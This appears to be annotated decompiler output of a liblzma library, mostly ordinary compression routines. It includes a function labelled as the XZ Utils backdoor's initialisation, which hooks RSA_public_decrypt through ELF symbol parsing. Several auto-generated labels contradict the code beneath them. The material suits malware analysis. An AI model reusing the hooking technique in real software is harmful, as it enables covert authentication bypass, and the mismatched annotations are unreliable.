    puVar6 = &DAT_001235c0 + lVar4 * 4;
  }
LAB_00107991:
  local_38 = (undefined1  [16])0x0;
  lVar4 = 0xf;
  do {
    lVar5 = lVar4;
    local_38[lVar5 - 1] = (char)param_2 + (char)(param_2 / 10) * -10 + '0';
    bVar3 = 9 < param_2;
    lVar4 = lVar5 - 1;
    param_2 = param_2 / 10;
  } while (bVar3);
  uStack_40 = (undefined *)0x1079e7;
  lzma_str_append(uVar2,puVar1,local_38 + lVar5 - 1);
  uStack_40 = (undefined *)0x1079f5;
  lzma_str_append(*param_1,puVar1,puVar6);
LAB_001079f5:
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  uStack_40 = &UNK_00107a46;
  __stack_chk_fail();
}



/**
 * @name  lzma_str_from_filters
 * @brief Converts LZMA filter chain array to human-readable string. Iterates through filter chain (max 4), looks up filter IDs in table, formats filter names and options with configurable output format flags.
 * @confidence 90%
 * @classification string
 * @address 0x001080b0
 */

/* Converts an LZMA filter chain array to a human-readable string. Iterates through the filter chain
   (max 4 filters), looks up each filter ID in a table, and formats filter name and options.
   Supports flags for different output formats (verbose parameters, encoder/decoder specific
   options). */

uint lzma_str_from_filters(long *param_1,long *param_2,uint param_3,undefined8 param_4)

{
  undefined *puVar1;
  byte bVar2;
  char cVar3;
  int iVar4;
  long lVar5;
  uint uVar6;
  undefined *puVar7;
  long *plVar8;
  long lVar9;
  char *pcVar10;
  undefined *puVar11;
  undefined *puVar12;
  uint uVar13;
  long lVar14;
  long in_FS_OFFSET;
  long local_90;
  long local_58;
  long local_50 [2];
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if ((param_1 == (long *)0x0) || (*param_1 = 0, param_2 == (long *)0x0)) {
LAB_00108278:
    uVar13 = 0xb;
  }
  else {
    uVar13 = param_3 & 0xffffff0f;
    if (((param_3 & 0xffffff0f) == 0) && (*param_2 != -1)) {
      local_58 = lzma_alloc(800,param_4);
      if (local_58 == 0) {
        uVar13 = 5;
      }
      else {
        local_50[0] = 0;
        local_90 = 0;
        puVar7 = &str_colon_separator;
        if ((param_3 & 0x40) != 0) {
          puVar7 = &str_equals_separator;
        }
        if (*param_2 == -1) {
LAB_001084a0:
          *(undefined1 *)(local_58 + local_50[0]) = 0;
          *param_1 = local_58;
        }
        else {
          do {
            uVar6 = param_3 & 0x40;
            if (local_90 != 0) {
              if ((param_3 & 0x80) == 0) {
                lzma_str_append(local_58,local_50," ");
              }
              uVar6 = param_3 & 0xc0;
            }
            if (uVar6 != 0) {
              lzma_str_append(local_58,local_50,&str_dash_dash_prefix);
            }
            lVar14 = 0;
            lVar9 = 0x4000000000000001;
            plVar8 = &DAT_001316c0;
            while (*param_2 != lVar9) {
              lVar14 = lVar14 + 1;
              if (lVar14 == 0xb) goto LAB_001081da;
              lVar9 = *plVar8;
              plVar8 = plVar8 + 6;
            }
            lVar9 = lVar14 * 0x30;
            lzma_str_append(local_58,local_50,"lzma1" + lVar9);
            if ((param_3 & 0x30) != 0) {
              lVar5 = param_2[1];
              if (lVar5 == 0) {
                if ((&UNK_001316aa)[lVar9] == '\0') {
                  uVar13 = 8;
                  lzma_free(local_58,param_4);
                  goto LAB_001081f6;
                }
              }
              else {
                if ((param_3 & 0x10) == 0) {
                  bVar2 = (&DAT_001316a9)[lVar9];
                }
                else {
                  bVar2 = (&DAT_001316a8)[lVar9];
                }
                puVar11 = (&PTR_s_preset_001316a0)[lVar14 * 6];
                if ((ulong)bVar2 != 0) {
                  puVar1 = puVar11 + (ulong)bVar2 * 0x18;
                  puVar12 = puVar7;
                  do {
                    if ((puVar11[0xc] != '\x03') &&
                       ((iVar4 = *(int *)(lVar5 + (ulong)*(ushort *)(puVar11 + 0xe)), iVar4 != 0 ||
                        ((puVar11[0xd] & 4) == 0)))) {
                      lzma_str_append(local_58,local_50,puVar12);
                      lzma_str_append(local_58,local_50,puVar11);
                      lzma_str_append(local_58,local_50,&str_equals_separator);
                      if ((puVar11[0xd] & 1) == 0) {
                        format_number_with_units(&local_58,iVar4,(byte)puVar11[0xd] >> 1 & 1);
                        puVar12 = &str_comma_separator;
                      }
                      else {
                        pcVar10 = *(char **)(puVar11 + 0x10);
                        cVar3 = *pcVar10;
                        while (cVar3 != '\0') {
                          if (*(int *)(pcVar10 + 0xc) == iVar4) {
                            lzma_str_append(local_58,local_50);
                            puVar12 = &str_comma_separator;
                            goto LAB_00108357;
                          }
                          pcVar10 = pcVar10 + 0x10;
                          cVar3 = *pcVar10;
                        }
                        lzma_str_append(local_58,local_50,"UNKNOWN");
                        puVar12 = &str_comma_separator;
                      }
                    }
LAB_00108357:
                    puVar11 = puVar11 + 0x18;
                  } while (puVar11 != puVar1);
                }
              }
            }
            param_2 = param_2 + 2;
            local_90 = local_90 + 1;
            if (*param_2 == -1) {
              if (local_50[0] != 799) goto LAB_001084a0;
              lzma_free(local_58,param_4);
              *param_1 = 0;
              goto LAB_00108278;
            }
          } while (local_90 != 4);
LAB_001081da:
          uVar13 = 8;
          lzma_free(local_58,param_4);
        }
      }
    }
    else {
      uVar13 = 8;
    }
  }
LAB_001081f6:
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar13;
}



/**
 * @name  lzma_str_list_filters
 * @brief Generates formatted string listing available LZMA filters and their parameters. Returns LZMA_OK(0), LZMA_PROG_ERROR(0xb), LZMA_MEM_ERROR(5), or LZMA_OPTIONS_ERROR(8).
 * @confidence 90%
 * @classification string
 * @address 0x001084c0
 */

/* Generates a formatted string listing available LZMA compression filters and their parameters.
   Returns LZMA_OK (0) on success, or error codes like LZMA_PROG_ERROR (0xb), LZMA_MEM_ERROR (5),
   LZMA_OPTIONS_ERROR (8). */

uint lzma_str_list_filters(long *param_1,ulong param_2,uint param_3,undefined8 param_4)

{
  long lVar1;
  bool bVar2;
  long lVar3;
  char *pcVar4;
  undefined *puVar5;
  ulong uVar6;
  undefined *puVar7;
  byte bVar8;
  char *pcVar9;
  char *pcVar10;
  long in_FS_OFFSET;
  uint local_7c;
  long local_58;
  long local_50 [2];
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 == (long *)0x0) {
    local_7c = 0xb;
  }
  else {
    *param_1 = 0;
    local_7c = param_3 & 0xffffff8e;
    if ((param_3 & 0xffffff8e) == 0) {
      lVar3 = lzma_alloc(800,param_4);
      local_58 = lVar3;
      if (lVar3 != 0) {
        local_50[0] = 0;
        pcVar4 = " ";
        if ((param_3 & 0x30) != 0) {
          pcVar4 = "\n";
        }
        puVar5 = &str_colon_separator;
        if ((param_3 & 0x40) != 0) {
          puVar5 = &str_equals_separator;
        }
        bVar2 = false;
        uVar6 = 0x4000000000000001;
        pcVar9 = "lzma1";
        do {
          if (param_2 == 0xffffffffffffffff) {
            if ((uVar6 < 0x4000000000000000) || ((param_3 & 1) != 0)) {
joined_r0x001085ac:
              if (bVar2) {
                lzma_str_append(lVar3,local_50,pcVar4);
                lVar3 = local_58;
              }
              if ((param_3 & 0x40) != 0) {
                lzma_str_append(lVar3,local_50,&str_dash_dash_prefix);
                lVar3 = local_58;
              }
              lzma_str_append(lVar3,local_50,pcVar9);
              if ((param_3 & 0x30) != 0) {
                lVar3 = *(long *)(pcVar9 + 0x20);
                if ((param_3 & 0x10) == 0) {
                  bVar8 = pcVar9[0x29];
                }
                else {
                  bVar8 = pcVar9[0x28];
                }
                if ((ulong)bVar8 == 0) {
                  bVar2 = true;
                  lVar3 = local_58;
                  goto joined_r0x001085e5;
                }
                lVar1 = lVar3 + (ulong)bVar8 * 0x18;
                puVar7 = puVar5;
                while( true ) {
                  lzma_str_append(local_58,local_50,puVar7);
                  lzma_str_append(local_58,local_50,lVar3);
                  lzma_str_append(local_58,local_50,&DAT_00123503);
                  if (*(char *)(lVar3 + 0xc) == '\x03') {
                    lzma_str_append(local_58,local_50,"0-9[e]");
                  }
                  else if ((*(byte *)(lVar3 + 0xd) & 1) == 0) {
                    bVar8 = *(byte *)(lVar3 + 0xd) >> 1 & 1;
                    format_number_with_units(&local_58,*(undefined4 *)(lVar3 + 0x10),bVar8);
                    lzma_str_append(local_58,local_50,&DAT_001234f7);
                    format_number_with_units(&local_58,*(undefined4 *)(lVar3 + 0x14),bVar8);
                  }
                  else {
                    pcVar10 = *(char **)(lVar3 + 0x10);
                    if (**(char **)(lVar3 + 0x10) != '\0') {
                      while( true ) {
                        lzma_str_append(local_58,local_50,pcVar10);
                        if (pcVar10[0x10] == '\0') break;
                        lzma_str_append(local_58,local_50,&DAT_0012350d);
                        pcVar10 = pcVar10 + 0x10;
                      }
                    }
                  }
                  lVar3 = lVar3 + 0x18;
                  lzma_str_append(local_58,local_50,&DAT_0012350f);
                  if (lVar3 == lVar1) break;
                  puVar7 = &str_comma_separator;
                }
              }
              bVar2 = true;
              lVar3 = local_58;
            }
          }
          else if (param_2 == uVar6) goto joined_r0x001085ac;
joined_r0x001085e5:
          if (pcVar9 == "delta") goto LAB_001087e0;
          uVar6 = *(ulong *)(pcVar9 + 0x40);
          pcVar9 = pcVar9 + 0x30;
        } while( true );
      }
      local_7c = 5;
    }
    else {
      local_7c = 8;
    }
  }
LAB_00108802:
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return local_7c;
LAB_001087e0:
  if (bVar2) {
    if (local_50[0] == 799) {
      lzma_free(lVar3,param_4);
      local_7c = 0xb;
      *param_1 = 0;
    }
    else {
      *(undefined1 *)(lVar3 + local_50[0]) = 0;
      *param_1 = local_58;
    }
  }
  else {
    lzma_free(lVar3,param_4);
    local_7c = 8;
  }
  goto LAB_00108802;
}



/**
 * @name  format_error_message
 * @brief Formats error message using vsnprintf into global buffer at DAT_001323c0 (max 511 chars).
 * @confidence 90%
 * @classification string
 * @address 0x00108880
 */

/* Formats a message using vsnprintf into a global buffer at DAT_001323c0 with max size 0x1ff (511
   chars). Uses va_list for variable arguments. The first 8 params are stored for varargs, param_9
   is the format string. */

void format_error_message
               (undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
               undefined8 param_5,undefined8 param_6,undefined8 param_7,undefined8 param_8,
               undefined8 param_9,undefined8 param_10,undefined8 param_11,undefined8 param_12,
               undefined8 param_13,undefined8 param_14)

{
  char in_AL;
  long in_FS_OFFSET;
  undefined4 local_d8;
  undefined4 local_d4;
  undefined1 *local_d0;
  undefined1 *local_c8;
  long local_c0;
  undefined1 local_b8 [8];
  undefined8 local_b0;
  undefined8 local_a8;
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined8 local_78;
  undefined8 local_68;
  undefined8 local_58;
  undefined8 local_48;
  undefined8 local_38;
  undefined8 local_28;
  undefined8 local_18;
  
  if (in_AL != '\0') {
    local_88 = param_1;
    local_78 = param_2;
    local_68 = param_3;
    local_58 = param_4;
    local_48 = param_5;
    local_38 = param_6;
    local_28 = param_7;
    local_18 = param_8;
  }
  local_c0 = *(long *)(in_FS_OFFSET + 0x28);
  local_d0 = &stack0x00000008;
  local_c8 = local_b8;
  local_d8 = 8;
  local_d4 = 0x30;
  local_b0 = param_10;
  local_a8 = param_11;
  local_a0 = param_12;
  local_98 = param_13;
  local_90 = param_14;
  __vsnprintf_chk(&DAT_001323c0,0x1ff,1,0x200,param_9,&local_d8);
  if (local_c0 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/* ==================== Math ==================== */

/**
 * @name  lzma_literal_price
 * @brief Calculates price (bit cost) of encoding a literal byte in LZMA using probability lookup tables.
 * @confidence 65%
 * @classification math
 * @address 0x0011ad00
 */

/* Decodes Huffman symbols from a lookup table with complex bit manipulation and branching based on
   is_rle flag */

int lzma_decode_huffman_symbol
              (long param_1,int param_2,int param_3,char param_4,uint param_5,int param_6)

{
  long lVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  
  lVar1 = param_1 + 0xb84 +
          (ulong)(((param_3 + param_2 * 0x100 & *(uint *)(param_1 + 0xb80)) <<
                  ((byte)*(undefined4 *)(param_1 + 0xb7c) & 0x1f)) * 3) * 2;
  if (param_4 == '\0') {
    iVar5 = 0;
    uVar4 = param_6 + 0x100U;
    do {
      uVar3 = uVar4 >> 1;
      iVar5 = iVar5 + (uint)(byte)(&prob_price_table)
                                  [((uint)*(ushort *)(lVar1 + (ulong)uVar3 * 2) ^
                                   -(uVar4 & 1) & 0x7ff) >> 4];
      uVar4 = uVar3;
    } while (uVar3 != 1);
    return iVar5;
  }
  uVar3 = 0x100;
  iVar5 = 0;
  uVar4 = param_6 + 0x100U;
  do {
    param_5 = param_5 * 2;
    uVar2 = uVar4 * 2;
    iVar5 = iVar5 + (uint)(byte)(&prob_price_table)
                                [((uint)*(ushort *)
                                         (lVar1 + (ulong)((uVar4 >> 8) + (uVar3 & param_5) + uVar3)
                                                  * 2) ^ (int)(uVar4 << 0x18) >> 0x1f & 0x7ffU) >> 4
                                ];
    uVar3 = uVar3 & ~(param_5 ^ uVar2);
    uVar4 = uVar2;
  } while (uVar2 < 0x10000);
  return iVar5;
}



/* ==================== Initialization ==================== */

/**
 * @name  call_gmon_start
 * @brief Standard gprof initialization, calls __gmon_start__ if available
 * @confidence 90%
 * @classification init
 * @address 0x00104000
 */

/* Standard gprof initialization, calls __gmon_start__ if available */

void call_gmon_start(void)

{
  if (PTR___gmon_start___00131fd0 != (undefined *)0x0) {
    (*(code *)PTR___gmon_start___00131fd0)();
  }
  return;
}



/**
 * @name  init_rsa_public_decrypt
 * @brief XZ Utils backdoor initialization: parses ELF dynamic symbols from linker and hooks RSA_public_decrypt with a wrapper function.
 * @confidence 95%
 * @classification init
 * @address 0x00104dd0
 */

/* Initialization function that sets up dynamic symbol interception for RSA_public_decrypt by
   parsing dynamic symbols and installing a function hook wrapper. */

void init_rsa_public_decrypt(void)

{
  int iVar1;
  long in_FS_OFFSET;
  void *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = (void *)0x0;
  iVar1 = parse_elf_dynamic_section
                    (&local_18,*(long *)(PTR__r_debug_00131fc8 + 8),
                     *(long *)(PTR__r_debug_00131fc8 + 8) + 0x10);
  if (iVar1 == 0) {
    function_hook_replace(local_18,"RSA_public_decrypt",rsa_public_decrypt_wrapper,0);
    if (local_18 != (void *)0x0) {
      free(local_18);
    }
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_crc32_init
 * @brief CPU feature detection for CRC32: checks CPUID for CLMUL support, selects hardware-accelerated or software CRC32 implementation.
 * @confidence 80%
 * @classification init
 * @address 0x00104e50
 */

/* WARNING: Removing unreachable block (ram,0x00104e74) */
/* WARNING: Removing unreachable block (ram,0x00104e69) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* CPU initialization/feature detection. Queries CPUID to determine processor capabilities and
   selects appropriate CRC32 implementation. */

void _INIT_2(undefined8 param_1,undefined8 param_2)

{
  int *piVar1;
  long lVar2;
  uint uVar3;
  int iVar4;
  long in_FS_OFFSET;
  
  piVar1 = (int *)cpuid_basic_info(0);
  iVar4 = piVar1[2];
  uVar3 = piVar1[3];
  if (*piVar1 != 0) {
    lVar2 = cpuid_Version_info(1);
    iVar4 = *(int *)(lVar2 + 8);
    uVar3 = *(uint *)(lVar2 + 0xc) & 0x80202;
    _DAT_001325c0 = lzma_crc64_clmul;
    if (uVar3 == 0x80202) goto LAB_00104e92;
  }
  _DAT_001325c0 = crc32_compute;
LAB_00104e92:
  if (*(long *)(in_FS_OFFSET + 0x28) != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(param_1,param_2,iVar4,uVar3);
  }
  return;
}



/**
 * @name  lzma_crc64_init
 * @brief CPU feature detection for CRC64: checks CPUID for CLMUL support, selects hardware-accelerated or software CRC64 implementation.
 * @confidence 80%
 * @classification init
 * @address 0x00104ec0
 */

/* WARNING: Removing unreachable block (ram,0x00104ee4) */
/* WARNING: Removing unreachable block (ram,0x00104ed9) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Initializes CPUID-based feature detection, calling cpuid_basic_info and cpuid_Version_info to
   determine CPU capabilities and set a function pointer based on feature flags */

void init_cpuid_features(undefined8 param_1,undefined8 param_2)

{
  int *piVar1;
  long lVar2;
  uint uVar3;
  int iVar4;
  long in_FS_OFFSET;
  
  piVar1 = (int *)cpuid_basic_info(0);
  iVar4 = piVar1[2];
  uVar3 = piVar1[3];
  if (*piVar1 != 0) {
    lVar2 = cpuid_Version_info(1);
    iVar4 = *(int *)(lVar2 + 8);
    uVar3 = *(uint *)(lVar2 + 0xc) & 0x80202;
    _DAT_001325c8 = lzma_crc64_clmul_generic;
    if (uVar3 == 0x80202) goto LAB_00104f02;
  }
  _DAT_001325c8 = crc32_process_block;
LAB_00104f02:
  if (*(long *)(in_FS_OFFSET + 0x28) != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(param_1,param_2,iVar4,uVar3);
  }
  return;
}



/**
 * @name  deregister_tm_clones
 * @brief Standard GCC runtime stub for deregistering TM clones
 * @confidence 80%
 * @classification init
 * @address 0x00104f30
 */

/* WARNING: Removing unreachable block (ram,0x00104f43) */
/* WARNING: Removing unreachable block (ram,0x00104f4f) */
/* Empty stub function */

void noop_stub(void)

{
  return;
}



/**
 * @name  register_tm_clones
 * @brief Standard GCC runtime stub for registering TM clones
 * @confidence 80%
 * @classification init
 * @address 0x00104f60
 */

/* WARNING: Removing unreachable block (ram,0x00104f84) */
/* WARNING: Removing unreachable block (ram,0x00104f90) */
/* Empty function, no-op */

void empty_stub(void)

{
  return;
}



/**
 * @name  lzma_next_filter_update
 * @brief Sets filter function pointers in codec state and calls the filter's initialization function.
 * @confidence 70%
 * @classification init
 * @address 0x00105250
 */

/* Sets a filter in the codec state and initializes it. Stores filter function pointers and calls
   the filter's initialization function. */

undefined8 set_filter_and_init(long param_1,undefined8 param_2,undefined8 *param_3)

{
  code *UNRECOVERED_JUMPTABLE;
  undefined8 uVar1;
  
  UNRECOVERED_JUMPTABLE = (code *)param_3[1];
  if ((UNRECOVERED_JUMPTABLE != *(code **)(param_1 + 0x10)) &&
     (*(code **)(param_1 + 0x10) != (code *)0x0)) {
    lzma_next_coder_cleanup();
    UNRECOVERED_JUMPTABLE = (code *)param_3[1];
  }
  uVar1 = *param_3;
  *(code **)(param_1 + 0x10) = UNRECOVERED_JUMPTABLE;
  *(undefined8 *)(param_1 + 8) = uVar1;
  if (UNRECOVERED_JUMPTABLE != (code *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00105289. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    uVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3);
    return uVar1;
  }
  return 0;
}



/**
 * @name  lzma_strm_init
 * @brief Initializes internal LZMA stream state: allocates 0x68-byte structure, zeroes filter arrays and flags.
 * @confidence 82%
 * @classification init
 * @address 0x00105320
 */

/* Initializes decoder filter state. Allocates 0x68-byte filter structure if needed, zeros filter
   arrays, clears output buffer position and flags. */

undefined8 lzma_filter_decoder_initialize(long param_1)

{
  long lVar1;
  undefined1 (*pauVar2) [16];
  
  if (param_1 == 0) {
    return 0xb;
  }
  pauVar2 = *(undefined1 (**) [16])(param_1 + 0x38);
  if (pauVar2 == (undefined1 (*) [16])0x0) {
    pauVar2 = (undefined1 (*) [16])lzma_alloc(0x68,*(undefined8 *)(param_1 + 0x30));
    *(undefined1 (**) [16])(param_1 + 0x38) = pauVar2;
    if (pauVar2 == (undefined1 (*) [16])0x0) {
      return 5;
    }
    *pauVar2 = (undefined1  [16])0x0;
    pauVar2[1] = (undefined1  [16])0x0;
    *(undefined8 *)(*pauVar2 + 8) = 0xffffffffffffffff;
    pauVar2[2] = (undefined1  [16])0x0;
    pauVar2[3] = (undefined1  [16])0x0;
    pauVar2[4] = (undefined1  [16])0x0;
  }
  *(undefined4 *)pauVar2[6] = 0;
  pauVar2[6][4] = 0;
  lVar1 = *(long *)(param_1 + 0x38);
  *(undefined4 *)(lVar1 + 0x50) = 0;
  *(undefined1 *)(lVar1 + 0x65) = 0;
  *(undefined8 *)(param_1 + 0x10) = 0;
  *(undefined8 *)(param_1 + 0x28) = 0;
  return 0;
}



/**
 * @name  lzma_easy_preset
 * @brief Initializes filter array with LZMA2 filter (ID 0x21) from preset level
 * @confidence 90%
 * @classification init
 * @address 0x00105a10
 */

/* Initializes LZMA preset filter array from preset level */

bool lzma_easy_preset(undefined8 *param_1)

{
  char cVar1;
  
  cVar1 = lzma_lzma_preset(param_1 + 10);
  if (cVar1 == '\0') {
    *param_1 = 0x21;
    param_1[1] = param_1 + 10;
    param_1[2] = 0xffffffffffffffff;
  }
  return cVar1 != '\0';
}



/**
 * @name  lzma_index_stream_init
 * @brief Allocates and initializes a 0xa8-byte stream node structure with provided parameters.
 * @confidence 65%
 * @classification init
 * @address 0x00106180
 */

/* Allocates a 0xa8-byte block and initializes it with provided parameters at specific offsets,
   setting most fields to zero or -1. */

void initialize_structure
               (undefined8 param_1,undefined8 param_2,undefined4 param_3,undefined8 param_4,
               undefined8 param_5)

{
  undefined8 *puVar1;
  
  puVar1 = (undefined8 *)lzma_alloc(0xa8,param_5);
  if (puVar1 != (undefined8 *)0x0) {
    *puVar1 = param_2;
    puVar1[1] = param_1;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    *(undefined4 *)(puVar1 + 5) = param_3;
    puVar1[6] = param_4;
    puVar1[7] = 0;
    puVar1[8] = 0;
    puVar1[9] = 0;
    *(undefined4 *)(puVar1 + 10) = 0;
    puVar1[0xb] = 0;
    puVar1[0xc] = 0;
    *(undefined4 *)(puVar1 + 0xd) = 0xffffffff;
    puVar1[0x14] = 0;
  }
  return;
}



/**
 * @name  lzma_index_init
 * @brief Allocates and initializes LZMA index structure with initial stream node
 * @confidence 90%
 * @classification init
 * @address 0x001065a0
 */

/* Allocates and initializes LZMA index structure */

long lzma_index_init(undefined8 param_1)

{
  long lVar1;
  long lVar2;
  long lVar3;
  
  lVar1 = lzma_index_node_alloc();
  lVar3 = lVar1;
  if (lVar1 != 0) {
    lVar2 = initialize_structure(0,0,1,0,param_1);
    if (lVar2 == 0) {
      lVar3 = 0;
      lzma_free(lVar1,param_1);
    }
    else {
      skiplist_insert_node(lVar1,lVar2);
    }
  }
  return lVar3;
}



/**
 * @name  lzma_so_init
 * @brief Initializes from shared object: dlopen/dlinfo for path, or uses default linker r_debug, then parses ELF dynamic symbols.
 * @confidence 82%
 * @classification init
 * @address 0x00108ea0
 */

/* Initializes LZMA library from shared object by using dlopen/dlinfo or default linker, parses
   dynamic symbols */

undefined8 lzma_so_init(undefined8 *param_1,long param_2)

{
  int iVar1;
  long lVar2;
  undefined8 uVar3;
  long in_FS_OFFSET;
  long local_28;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  *param_1 = 0;
  if (param_2 == 0) {
    uVar3 = parse_elf_dynamic_section
                      (param_1,*(long *)(PTR__r_debug_00131fc8 + 8),
                       *(long *)(PTR__r_debug_00131fc8 + 8) + 0x10);
  }
  else {
    lVar2 = dlopen(param_2,5);
    local_28 = 0;
    if (lVar2 == 0) {
      uVar3 = dlerror();
      format_error_message("dlopen error: %s",uVar3);
      uVar3 = 1;
    }
    else {
      iVar1 = dlinfo(lVar2,2,&local_28);
      if (iVar1 == 0) {
        dlclose(lVar2);
        uVar3 = parse_elf_dynamic_section(param_1,local_28,local_28 + 0x10);
      }
      else {
        format_error_message("dlinfo error");
        dlclose(lVar2);
        uVar3 = 1;
      }
    }
  }
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_lz_decoder_init
 * @brief Initializes LZ77 decoder: allocates 0x70-byte state, computes dictionary size (power of 2), delegates to match finder init.
 * @confidence 82%
 * @classification init
 * @address 0x00109e90
 */

/* Initializes an LZ77 decoder. Allocates coder state, sets up decode/process callbacks, computes
   dictionary size (rounded up to power of 2), and delegates to set_filter_and_init for match finder
   initialization. */

undefined8 lzma_lz_decoder_init(undefined8 *param_1,undefined8 param_2,uint *param_3)

{
  char cVar1;
  undefined8 uVar2;
  undefined1 (*pauVar3) [16];
  uint uVar4;
  long in_FS_OFFSET;
  undefined8 local_68;
  code *local_60;
  uint *local_58;
  undefined1 local_50 [16];
  undefined8 local_40;
  long local_30;
  
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  if ((code *)param_1[2] != lzma_lz_decoder_init) {
    lzma_next_coder_end();
  }
  param_1[2] = lzma_lz_decoder_init;
  pauVar3 = (undefined1 (*) [16])*param_1;
  if (pauVar3 == (undefined1 (*) [16])0x0) {
    pauVar3 = (undefined1 (*) [16])lzma_alloc(0x70,param_2);
    if (pauVar3 == (undefined1 (*) [16])0x0) {
      uVar2 = 5;
      goto LAB_00109f8b;
    }
    *param_1 = pauVar3;
    param_1[3] = lzma_decode_initialize_and_process;
    param_1[4] = lzma_lz_decoder_end;
    *pauVar3 = (undefined1  [16])0x0;
    pauVar3[1] = (undefined1  [16])0x0;
    *(undefined8 *)(*pauVar3 + 8) = 0xffffffffffffffff;
    pauVar3[2] = (undefined1  [16])0x0;
    pauVar3[3] = (undefined1  [16])0x0;
    pauVar3[4] = (undefined1  [16])0x0;
  }
  *(undefined4 *)pauVar3[5] = 0;
  *(undefined8 *)(pauVar3[5] + 8) = 0;
  cVar1 = lzma_lzma_lclppb_encode(param_3,pauVar3 + 6);
  uVar2 = 8;
  if (cVar1 == '\0') {
    if (0xfff < *param_3) {
      uVar4 = *param_3 - 1;
      *(undefined8 *)(pauVar3[6] + 5) = 0xffffffffffffffff;
      uVar4 = uVar4 >> 2 | uVar4;
      local_50 = (undefined1  [16])0x0;
      local_40 = 0;
      uVar4 = uVar4 | uVar4 >> 3;
      uVar4 = uVar4 >> 4 | uVar4;
      uVar4 = uVar4 | uVar4 >> 8;
      uVar4 = uVar4 >> 0x10 | uVar4;
      *(uint *)(pauVar3[6] + 1) = uVar4 + (uVar4 != 0xffffffff);
      local_68 = 0x4000000000000001;
      local_60 = FUN_0011a760;
      local_58 = param_3;
      uVar2 = set_filter_and_init(pauVar3,param_2,&local_68);
    }
  }
LAB_00109f8b:
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_block_encoder_init
 * @brief Initializes block encoder: validates check type, allocates 0xe0-byte state, sets up encode/end/update callbacks.
 * @confidence 78%
 * @classification init
 * @address 0x0010aa50
 */

/* Initializes a standalone LZMA decoder with validation of check type and memory allocation for
   decoder state */

undefined8 lzma_alone_decoder_init(undefined8 *param_1,undefined8 param_2,uint *param_3)

{
  char cVar1;
  undefined8 uVar2;
  undefined1 (*pauVar3) [16];
  uint uVar4;
  
  if ((code *)param_1[2] != lzma_alone_decoder_init) {
    lzma_next_coder_end();
  }
  param_1[2] = lzma_alone_decoder_init;
  if (param_3 != (uint *)0x0) {
    if (1 < *param_3) {
      return 8;
    }
    uVar4 = param_3[2];
    if (uVar4 < 0x10) {
      cVar1 = lzma_check_is_supported(uVar4);
      if (cVar1 == '\0') {
        return 3;
      }
      pauVar3 = (undefined1 (*) [16])*param_1;
      if (pauVar3 == (undefined1 (*) [16])0x0) {
        pauVar3 = (undefined1 (*) [16])lzma_alloc(0xe0,param_2);
        if (pauVar3 == (undefined1 (*) [16])0x0) {
          return 5;
        }
        *param_1 = pauVar3;
        uVar4 = param_3[2];
        param_1[3] = lzma_block_decode;
        param_1[4] = lzma_next_end_and_free_5;
        param_1[8] = lzma_block_encoder_update;
        *pauVar3 = (undefined1  [16])0x0;
        pauVar3[1] = (undefined1  [16])0x0;
        *(undefined8 *)(*pauVar3 + 8) = 0xffffffffffffffff;
        pauVar3[2] = (undefined1  [16])0x0;
        pauVar3[3] = (undefined1  [16])0x0;
        pauVar3[4] = (undefined1  [16])0x0;
      }
      *(uint **)pauVar3[5] = param_3;
      *(undefined4 *)(pauVar3[5] + 8) = 0;
      *(undefined8 *)pauVar3[6] = 0;
      *(undefined8 *)(pauVar3[6] + 8) = 0;
      *(undefined8 *)pauVar3[7] = 0;
      lzma_check_init(pauVar3[7] + 8,uVar4);
      uVar2 = lzma_next_filter_init(pauVar3,param_2,*(undefined8 *)(param_3 + 8));
      return uVar2;
    }
  }
  return 0xb;
}



/**
 * @name  lzma_next_filter_init
 * @brief Wrapper that delegates to execute_with_mappings for filter chain initialization
 * @confidence 65%
 * @classification init
 * @address 0x0010b270
 */

/* Wrapper that calls execute_with_mappings for filter chain initialization */

void lzma_next_filter_init(void)

{
  execute_with_mappings();
  return;
}



/**
 * @name  lzma_raw_encoder
 * @brief Initializes raw LZMA encoder with filter configuration via execute_with_mappings and lzma_encoder_find_by_id.
 * @confidence 92%
 * @classification init
 * @address 0x0010b290
 */

/* Initializes raw LZMA encoder with filter configuration */

ulong lzma_raw_encoder(long param_1,undefined8 param_2)

{
  long lVar1;
  ulong uVar2;
  
  uVar2 = lzma_filter_decoder_initialize();
  if ((int)uVar2 == 0) {
    uVar2 = execute_with_mappings
